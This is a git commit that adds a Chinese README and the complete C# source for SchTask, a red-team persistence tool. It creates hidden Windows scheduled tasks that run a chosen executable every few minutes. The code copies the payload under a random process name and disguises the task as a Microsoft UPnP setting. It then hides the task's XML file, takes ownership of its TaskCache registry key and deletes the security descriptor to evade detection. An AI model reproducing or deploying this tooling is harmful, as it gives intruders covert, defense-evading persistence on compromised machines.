30f3fe45f5cc723013610ef4ea892ee1d91eb42a
An0nySec <anonysec@vip.qq.com>
2021-08-30 11:31:37 +0800

    Update

--- README.md
+++ README.md
@@ -1,2 +1,94 @@
-# SchTask_0x727
-创建隐藏计划任务，权限维持
+
+![logo](./imgs/logo.png)
+
+# SchTask
+
+| 类别 | 说明 |
+| ---- | --- |
+| 作者 | [AnonySec](https://github.com/An0nysec) |
+| 团队 | [0x727](https://github.com/0x727) 未来一段时间将陆续开源工具 |
+| 定位 | 权限维持，内存加载 |
+| 语言 | C# |
+| 功能 | 创建隐藏的计划任务，进行权限维持 |
+
+## 什么是 SchTask ?
+
+利用 Windows API，工具化创建隐藏的计划任务，同时绕过安全软件的阻断，达到持久控制。
+
+## 实现原理 ?
+
+### Steps
+
+1. 选择主机随机进程名作为计划任务程序文件名
+2. 将计划任务程序文件复制到 `%AppData%\Microsoft\Windows\Themes\` 中
+3. 创建的计划任务名取同一随机进程名
+4. 计划任务触发器以分钟为单位，无限期持续
+5. 更改 Index、删除 SD 的键值，隐藏计划任务对应的 XML 文件
+6. ~~删除已添加的计划任务~~
+
+### Articles
+
+更多技术细节，请查看  [Windows计划任务的进阶](https://payloads.cn/2021/0805/advanced-windows-scheduled-tasks.html)
+
+## 开始体验
+
+### Git下载安装
+
+```bash
+$ git clone https://github.com/0x727/SchTask_0x727.git
+```
+
+> 注：直接下载 [Release](https://github.com/0x727/SchTask_0x727/releases/) 版本快速使用，已经将 `Microsoft.Win32.TaskScheduler.dll` 打包到 SchTask.exe 中。
+
+## 使用方法
+
+### SchTask.exe   (.NET Framework 2.0)
+
+```
+C:\>SchTask.exe
+  ___       _____ ____ _____
+ / _ \__  _|___  |___ \___  |
+| | | \ \/ /  / /  __)|  / /
+| |_| |>  <  / /  / __/ / /     https://github.com/0x727
+ \___//_/\_\/_/  |_____/_/      Author: AnonySec
+
+Usage: SchTask.exe <File Path> <Minutes>
+   Eg: SchTask.exe C:\Windows\System32\cmd.exe 10
+
+C:\>SchTask.exe C:\Windows\System32\cmd.exe 1
+  ___       _____ ____ _____
+ / _ \__  _|___  |___ \___  |
+| | | \ \/ /  / /  __)|  / /
+| |_| |>  <  / /  / __/ / /     https://github.com/0x727
+ \___//_/\_\/_/  |_____/_/      Author: AnonySec
+
+[*] Copy File location:
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Themes\SearchApp.exe
+[*] Hidden task xml file:
+C:\Windows\System32\Tasks\Microsoft\Windows\UPnP\SearchApp
+[*] RegistryKey location:
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UPnP\SearchApp
+
+[+] Successfully add scheduled task !
+```
+
+### 效果图
+
+![image-20210127170232740](./imgs/SchTask.gif)
+
+## 为 SchTask 做贡献
+
+SchTask 是一个免费且开源的项目，我们欢迎任何人为其开发和进步贡献力量。
+
+- 在使用过程中出现任何问题，可以通过 issues 来反馈。
+- Bug 的修复可以直接提交 Pull Request 到 dev 分支。
+- 如果是增加新的功能特性，请先创建一个 issue 并做简单描述以及大致的实现方法，提议被采纳后，就可以创建一个实现新特性的 Pull Request。
+- 欢迎对说明文档做出改善，帮助更多的人使用 SchTask，特别是英文文档。
+- 贡献代码请提交 PR 至 dev 分支，master 分支仅用于发布稳定可用版本。
+- 如果你有任何其他方面的问题或合作，欢迎发送邮件至 0x727Team@gmail.com 。
+
+> 提醒：和项目相关的问题最好在 issues 中反馈，这样方便其他有类似问题的人可以快速查找解决方法，并且也避免了我们重复回答一些问题。
+
+## Stargazers over time
+
+[![Stargazers over time](https://starchart.cc/0x727/SchTask_0x727.svg)](https://starchart.cc/0x727/SchTask_0x727)
---
+++ SchTask/Program.cs
@@ -0,0 +1,191 @@
+﻿using System;
+using Microsoft.Win32.TaskScheduler;
+using System.Diagnostics;
+using System.IO;
+using Microsoft.Win32;
+using System.Security.AccessControl;
+using CosmosKey.Utils;
+using System.Security.Principal;
+
+namespace SchTask
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //if (args.Length == 1)
+            //{
+            //    string taskname = args[0];
+            //    DeleteTask(taskname);
+            //    return;
+            //}
+
+            if (args.Length != 2)
+            {
+                Banner();
+                Console.WriteLine("\nUsage: SchTask.exe <File Path> <Minutes>");
+                Console.WriteLine(@"   Eg: SchTask.exe C:\Windows\System32\cmd.exe 10");
+                //Console.WriteLine("\nUsage: SchTask.exe <TaskName>");
+                //Console.WriteLine("[!] Add the scheduled task first and then delete it");
+            }
+            else
+            {
+                Banner();
+                string inputfile = args[0];
+                string min = args[1];
+
+                //选择主机随机进程名
+                Process[] progresses = Process.GetProcesses();
+                Random random = new Random();
+                string randomname = (progresses[random.Next(progresses.Length)].ProcessName);
+                if (File.Exists(inputfile))
+                {
+                    Copy(inputfile, randomname, min);
+                    return;
+                }
+                Console.WriteLine("\n[x] Local file not found !");
+            }
+        }
+        public static void Banner()
+        {
+            Console.WriteLine(@"  ___       _____ ____ _____");
+            Console.WriteLine(@" / _ \__  _|___  |___ \___  |");
+            Console.WriteLine(@"| | | \ \/ /  / /  __)|  / /");
+            Console.WriteLine(@"| |_| |>  <  / /  / __/ / /     https://github.com/0x727");
+            Console.WriteLine(@" \___//_/\_\/_/  |_____/_/      Author: AnonySec");
+        }
+        //文件复制到 %AppData%\Microsoft\Windows\Themes\ 中
+        public static void Copy(string inputfile, string randomname, string min)
+        {
+            string appdataFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string sourceFile = $@"{inputfile}";
+            //获取拓展名
+            string extension = Path.GetExtension(sourceFile);
+            string destinationFile = appdataFile + $@"\Microsoft\Windows\Themes\{randomname}" + extension;
+            if (File.Exists(destinationFile))
+            {
+                Console.WriteLine($"\n[x] File name exists: {destinationFile}");
+                return;
+            }
+            else
+            {
+                File.Copy(sourceFile, destinationFile);
+                //File.Move(sourceFile, destinationFile);
+                Console.WriteLine($"\n[*] Copy File location: \n{destinationFile}");
+                CreateTask(randomname, destinationFile, min);
+            }
+        }
+        //创建计划任务
+        public static void CreateTask(string randomname, string destinationFile, string min)
+        {
+            TaskDefinition td = TaskService.Instance.NewTask();
+            td.RegistrationInfo.Author = "Microsoft"; //创建者
+            td.RegistrationInfo.Description = "UPnPHost Service Settings"; //描述
+            //计划任务运行时间 Min/Day
+            double time = double.Parse(min);
+            TimeTrigger tt = new TimeTrigger();
+            tt.StartBoundary = DateTime.Now;
+            tt.Repetition.Interval = TimeSpan.FromMinutes(time);
+
+            td.Triggers.Add(tt);
+            td.Actions.Add(destinationFile, null, null);
+            string taskpath = @"\Microsoft\Windows\UPnP\" + randomname;
+            TaskService.Instance.RootFolder.RegisterTaskDefinition(taskpath, definition: td, TaskCreation.CreateOrUpdate, null, null, 0);
+            HidXml(taskpath);
+            RegistryKeyRule(randomname);
+        }
+        //隐藏 %SystemRoot%\System32\Tasks 下计划任务对应的 XML 文件
+        public static void HidXml(string taskpath)
+        {
+            string xml = $@"C:\Windows\System32\Tasks" + taskpath;
+            FileInfo info = new FileInfo(xml);
+            if (info.Exists)
+            {
+                info.Attributes = FileAttributes.Hidden;
+                Console.WriteLine($"[*] Hidden task xml file: \n{xml}");
+            }
+        }
+        public static void RegistryKeyRule(string randomname)
+        {
+            string regpath = @"Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UPnP\" + randomname;
+            try
+            {
+                //授予Restore、Backup、TakeOwnership特权
+                TokenManipulator.AddPrivilege("SeRestorePrivilege");
+                TokenManipulator.AddPrivilege("SeBackupPrivilege");
+                TokenManipulator.AddPrivilege("SeTakeOwnershipPrivilege");
+
+                //更改注册表项值的所有者
+                RegistryKey subKey = Registry.LocalMachine.OpenSubKey(regpath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
+                RegistrySecurity rs = new RegistrySecurity();
+                //设置安全性的所有者为Administrators
+                rs.SetOwner(new NTAccount("Administrators"));
+                //为注册表项设置权限
+                subKey.SetAccessControl(rs);
+
+                //更改注册表项值的权限
+                RegistryAccessRule rar = new RegistryAccessRule("Administrators", RegistryRights.FullControl, AccessControlType.Allow);
+                rs.AddAccessRule(rar);
+                subKey.SetAccessControl(rs);
+                subKey.Close();
+
+                RegistryKey rk = Registry.LocalMachine.OpenSubKey(regpath, true);
+                //设置Index值为0，隐藏计划任务，默认值为1
+                rk.SetValue("Index", 0, RegistryValueKind.DWord);
+                rk.Close();
+
+                RegeditKeyExist(regpath);
+
+                string rkl = Registry.LocalMachine + "\\" + regpath;
+                Console.WriteLine($"[*] RegistryKey location: \n{rkl}");
+            }
+            finally
+            {
+                //删除Restore、Backup、TakeOwnership特权
+                TokenManipulator.RemovePrivilege("SeRestorePrivilege");
+                TokenManipulator.RemovePrivilege("SeBackupPrivilege");
+                TokenManipulator.RemovePrivilege("SeTakeOwnershipPrivilege");
+
+                Console.WriteLine("\n[+] Successfully add scheduled task !");
+            }
+        }
+        //判断SD键值是否存在（Win7 与 win2008 无SD）
+        public static void RegeditKeyExist(string regpath)
+        {
+            string[] subkeyNames;
+            RegistryKey sd = Registry.LocalMachine.OpenSubKey(regpath, true);
+            subkeyNames = sd.GetValueNames();
+            foreach (string keyName in subkeyNames)
+            {
+                if (keyName == "SD")
+                {
+                    sd.DeleteValue("SD");
+                    sd.Close();
+                    return;
+                }
+            }
+            sd.Close();
+            return;
+        }
+        //删除计划任务 (需要管理员权限)
+        public static void DeleteTask(string taskname)
+        {
+            //不要写成 "\Microsoft\Windows\UPnP\" — 报错 — 找不到
+            string taskpath = @"\Microsoft\Windows\UPnP";
+            //获得计划任务
+            TaskService ts = new TaskService();
+            TaskCollection tc = ts.GetFolder(taskpath).GetTasks();
+            //Console.WriteLine($"{tc}");
+            if (tc.Exists(taskname))
+            {
+                string dtask = taskpath + "\\" + taskname;
+                ts.RootFolder.DeleteTask(dtask);
+                Console.WriteLine("\n[+] Successfully delete scheduled task !");
+            }
+            else
+            {
+                Console.WriteLine("\n[!] Please add scheduled task !");
+            }
+        }
+    }
+}
